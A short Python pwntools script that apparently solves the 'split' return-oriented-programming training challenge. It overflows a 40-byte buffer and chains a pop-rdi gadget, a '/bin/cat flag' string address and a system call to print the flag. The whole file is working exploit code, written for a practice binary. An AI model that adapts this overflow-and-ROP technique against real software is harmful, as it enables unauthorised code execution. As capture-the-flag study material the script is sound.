#!/usr/bin/python3
from pwn import *

elf = context.binary = ELF('split')

context.log_level = 'debug'


cat_addr = 0x00601060
system = 0x000000000040074b

rop_chain = p64(0x00000000004007c3)		#address of the gadget
rop_chain += p64(0x00601060)			#address of the "/bin/cat flag" in the binary
rop_chain += p64(0x000000000040074b)	#address of the system function called in the binary inside the other function

offset = 40
padding = cyclic(offset)

payload = padding + rop_chain
io = process(elf.path)
io.sendline(payload)
io.wait_for_close()
io.recv()
